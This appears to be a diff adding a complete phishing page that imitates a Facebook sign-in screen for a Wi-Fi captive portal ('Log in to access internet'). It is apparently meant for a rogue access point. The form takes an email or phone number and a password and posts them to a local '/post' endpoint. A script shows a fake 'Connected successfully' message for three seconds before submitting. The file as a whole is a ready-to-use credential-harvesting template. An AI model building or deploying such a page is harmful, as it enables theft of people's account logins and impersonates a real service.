@@ -1,0 +1,183 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Sign in to Facebook</title>
+  <meta charset='UTF-8'>
+  <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+  <style>
+    a:hover{
+      text-decoration: underline;
+    }
+    body{
+      font-family: Arial, sans-serif;
+      align-items: center;
+      justify-content: center;
+      background-color: #FFFFFF;
+    }
+    input[type='text'], input[type='password']{
+      background-color: rgb(250,250,250);
+      width: 100%;
+      padding: 12px 10px;
+      margin: 8px 0;
+      box-sizing: border-box;
+      border: 1px solid #cccccc;
+      border-radius: 3px;
+    }
+    .container{
+      margin: auto;
+      padding: 20px;
+      max-width: 700px;
+    }
+    .logo-container{
+      text-align: center;
+      margin-bottom: 30px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .logo{
+      width: 40px;
+      height: 40px;
+      fill: #FFC72C;
+      margin-right: 100px;
+    }
+    .company-name{
+      font-size: 42px;
+      color: black;
+      margin-left: 0px;
+    }
+    .form-container{
+      background: #FFFFFF;
+      border: 1px solid #CEC0DE;
+      border-radius: 4px;
+      padding: 20px;
+      box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);
+    }
+    h1{
+      text-align: center;
+      font-size: 28px;
+      font-weight: 500;
+      margin-bottom: 20px;
+    }
+    .input-field{
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #BEABD3;
+      border-radius: 4px;
+      margin-bottom: 20px;
+      font-size: 14px;
+    }
+    .submit-btn{
+      background: #0866ff;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 20px;
+      font-weight: bold;
+      line-height: 48px;
+      width: 100%;
+    }
+    .submit-btn:hover{
+      background: #0866ff;
+    }
+    .forgot-btn{
+      background: transparent;
+      color: #0b57d0;
+      border-radius: 8px;
+      border: none;
+      font-size: 14px;
+      cursor: pointer;
+    }
+    .forgot-btn:hover{
+      background-color: rgba(11,87,208,0.08);
+    }
+    .containerlogo{
+      padding-top: 25px;
+    }
+    .containerlogo img{
+      max-width: 40%;
+    }
+    .containertitle{
+      color: #202124;
+      font-size: 24px;
+      padding: 15px 0px 10px 0px;
+    }
+    .containersubtitle{
+      color: #202124;
+      font-size: 16px;
+      padding: 0px 0px 30px 0px;
+    }
+    .containerbtn{
+      display: flex;
+      justify-content: end;
+      padding: 10px 0px 10px 0px;
+    }
+    div#form-block{
+      min-height: 150px;
+    }
+    div#success-block{
+      display: none;
+      text-align: center;
+      min-height: 100px;
+      margin-bottom: 30px;
+      justify-content: center;
+      align-items: center;
+    }
+    @media screen and (min-width: 768px){
+      .logo{
+        max-width: 80px;
+        max-height: 80px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class='container'>
+    <div class='logo-container'>
+      <?xml version='1.0' standalone='no'?>
+      <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'>
+    </div>
+    <div class=form-container>
+      <center>
+        <div class='containerlogo'>
+          <img data-testid=accessibleImg class="___1v417w0 f2rbwfs frvgh55" src=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDkwIiBoZWlnaHQ9IjM2MCIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDEwOTAgMzYwIj4KICA8cGF0aCBmaWxsPSIjMDg2NkZGIiBkPSJNODgxLjU4MyAyNTcuODk3aDI5LjQ4di00Ny42OTZsNDEuMTM3IDQ3LjY5NmgzNi4wNzJsLTQ3Ljg5LTU0Ljk2OSA0MC45MDktNDcuNjYzaC0zMi44MjVsLTM3LjQwMyA0My45M3YtOTYuOTgybC0yOS40OCAzLjg2NHYxNTEuODJabS02Ny45ODgtMTA1LjI2MWMtMzIuNzI4IDAtNTUuNDU1IDIyLjAxMy01NS40NTUgNTMuOTI5czIyLjcyNyA1My45MjkgNTUuNDU1IDUzLjkyOWMzMi43MjcgMCA1NS40NTUtMjIuMDEzIDU1LjQ1NS01My45MjlzLTIyLjcyOC01My45MjktNTUuNDU1LTUzLjkyOVptMCA4Mi43MjhjLTE1LjE2MyAwLTI1LjU1Mi0xMS43MjEtMjUuNTUyLTI4Ljc5OXMxMC4zODktMjguNzk5IDI1LjU1Mi0yOC43OTljMTUuMTYyIDAgMjUuNTUyIDExLjcyMSAyNS41NTIgMjguNzk5cy0xMC4zOSAyOC43OTktMjUuNTUyIDI4Ljc5OVptLTExOS44MDctODIuNzI4Yy0zMi43MjcgMC01NS40NTUgMjIuMDEzLTU1LjQ1NSA1My45MjlzMjIuNzI4IDUzLjkyOSA1NS40NTUgNTMuOTI5YzMyLjcyOCAwIDU1LjQ1NS0yMi4wMTMgNTUuNDU1LTUzLjkyOXMtMjIuNzI3LTUzLjkyOS01NS40NTUtNTMuOTI5Wm0wIDgyLjcyOGMtMTUuMTYyIDAtMjUuNTUyLTExLjcyMS0yNS41NTItMjguNzk5czEwLjM5LTI4Ljc5OSAyNS41NTItMjguNzk5YzE1LjE2MyAwIDI1LjU1MiAxMS43MjEgMjUuNTUyIDI4Ljc5OXMtMTAuMzg5IDI4Ljc5OS0yNS41NTIgMjguNzk5Wm0tMTEyLjgyNi04Mi43MjhjLTEzLjYzNiAwLTI0LjkzNSA1LjM1Ny0zMi4wMTMgMTUuMTYydi02NS41ODVsLTI5LjUxMyAzLjgzMXYxNTEuODJoMjYuMTY5bC41MTktMTUuODQ0YzYuOTgxIDExLjgxOCAxOS40ODEgMTguNDc0IDM0LjgzOCAxOC40NzQgMjcuOTg4IDAgNDguNDc1LTIyLjcyOCA0OC40NzUtNTMuOTI5IDAtMzEuMjAyLTIwLjM5LTUzLjkyOS00OC40NzUtNTMuOTI5Wm0tNi45OCA4Mi43MjhjLTE1LjE2MyAwLTI1LjU1Mi0xMS43MjEtMjUuNTUyLTI4Ljc5OXMxMC4zODktMjguNzk5IDI1LjU1Mi0yOC43OTljMTUuMTYyIDAgMjUuNTUyIDExLjcyMSAyNS41NTIgMjguNzk5cy0xMC4zOSAyOC43OTktMjUuNTUyIDI4Ljc5OVptLTExMy42MzggMS4zMzFjLTE1LjY0OSAwLTI2Ljg4My03LjI3My0zMC43MTQtMTkuODA1aDcyLjYzYy43MTUtMy44MzEgMS4yMDItOC4zNzcgMS4yMDItMTEuNDI5IDAtMzMuMDItMTguNDc1LTUyLjgyNS00OS41MTQtNTIuODI1LTMxLjMzMSAwLTUzLjAyIDIyLjAxMy01My4wMiA1My45MjkgMCAzMi4zMzggMjIuNzI4IDUzLjkyOSA1Ni40NjIgNTMuOTI5IDE3LjQ2NyAwIDM0LjQ0OC01Ljg0NCA0NS4wNjUtMTUuNTUybC0xMC42MTctMTguNzAxYy0xMC4yOTIgNy4xMS0yMC4zOSAxMC40NTQtMzEuNDk0IDEwLjQ1NFptLTYuNTkxLTYxLjEzN2MxMy42MzcgMCAyMi4zMzggOC4yNzkgMjIuMzM4IDIxLjEwNHYuMDk4aC00Ny4wNzhjMi44MjUtMTMuNjA0IDExLjYyMy0yMS4yMDIgMjQuNzQtMjEuMjAyWm0tOTguOTk0IDg0Ljk2OGMxNS4yNiAwIDMwLjE5NS01Ljg0NCA0MC43MTQtMTUuOTc0bC0xMS41MjYtMTkuMzgzYy04LjE4MiA2LjM2NC0xNy40NjcgOS44MDUtMjYuMjY2IDkuODA1LTE2LjM2NCAwLTI3LjI3My0xMS40MjktMjcuMjczLTI4LjM3N3MxMC45MDktMjguMzc3IDI3LjI3My0yOC4zNzdjOC4wODQgMCAxNi44ODMgMi45MjIgMjQuMDI2IDguMDg1bDExLjcyMS0xOS44MDZjLTkuNDgxLTguNTcxLTI0LjE1Ni0xMy44MzEtMzguNzAyLTEzLjgzMS0zMi4wMTMgMC01NC42NDMgMjIuMzM4LTU0LjY0MyA1My45MjkuMDMyIDMxLjQ5NCAyMi42NjIgNTMuOTI5IDU0LjY3NiA1My45MjlabS05My43MzUtMTA1LjI2MS0uNTE5IDE1Ljk3NWMtNi45ODEtMTEuOTE2LTE5LjQ4MS0xOC41NzItMzQuODM4LTE4LjU3Mi0yOC4wODUgMC00OC40NzUgMjIuNzI4LTQ4LjQ3NSA1My45MjkgMCAzMS4yMDIgMjAuNTIgNTMuOTI5IDQ4LjQ3NSA1My45MjkgMTUuMzU3IDAgMjcuODg5LTYuNjU2IDM0LjgzOC0xOC40NzRsLjUxOSAxNS44NDRoMjYuMTY5VjE1NS4yNjVoLTI2LjE2OVptLTI4LjM3NyA4MC4wOTljLTE1LjE2MiAwLTI1LjU1Mi0xMS43MjEtMjUuNTUyLTI4Ljc5OXMxMC4zOS0yOC43OTkgMjUuNTUyLTI4Ljc5OWMxNS4xNjMgMCAyNS41NTIgMTEuNzIxIDI1LjU1MiAyOC43OTlzLTEwLjQyMiAyOC43OTktMjUuNTUyIDI4Ljc5OVptLTU3LjY2My03OS45MDZoLTI2LjUyNnYtOC43NjdjMC0xMy4xMTcgNS4xMy0xOC4xNDkgMTguNDQyLTE4LjE0OSA0LjEyMyAwIDcuNDY3LjA5NyA5LjM4My4yOTJ2LTIyLjVjLTMuNjM3LTEuMDA3LTEyLjUtMi4wMTMtMTcuNjMtMi4wMTMtMjcuMTExIDAtMzkuNjExIDEyLjc5Mi0zOS42MTEgNDAuNDIydjEwLjY4MmgtMTYuNzUzdjI0LjgwNmgxNi43NTN2NzcuNjMxaDI5LjQ0OHYtNzcuNTk5aDIxLjk0OWw0LjU0NS0yNC44MDVaIi8+Cjwvc3ZnPgo alt=Facebook role>
+        </div>
+      </center>
+      <div id='form-block'>
+        <center>
+          <div class='containersubtitle'>Log in to access internet</div>
+        </center>
+        <form action='/post' id='login-form'>
+          <input name='email' class='input-field' type='text' placeholder='Email or phone number' required>
+          <input name='password' class='input-field' type='password' placeholder='Password' required />
+          <div class='containerbtn'>
+            <button id=submitbtn class=submit-btn type=submit>Log in</button>
+          </div>
+          <div class='containermsg'>
+            <center><button class="forgot-btn">Forgot password?</button></center>
+          </div>
+        </form>
+      </div>
+      <div id='success-block'>
+        <center>
+          <div>Connected successfully. </br>You will be redirected shortly.</div>
+        </center>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('login-form').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      document.getElementById('success-block').style.display = 'flex';
+      document.getElementById('form-block').style.display = 'none';
+
+      setTimeout(function() {
+        document.getElementById('login-form').submit();
+      }, 3000);
+    });
+  </script>
+</body>
+</html>
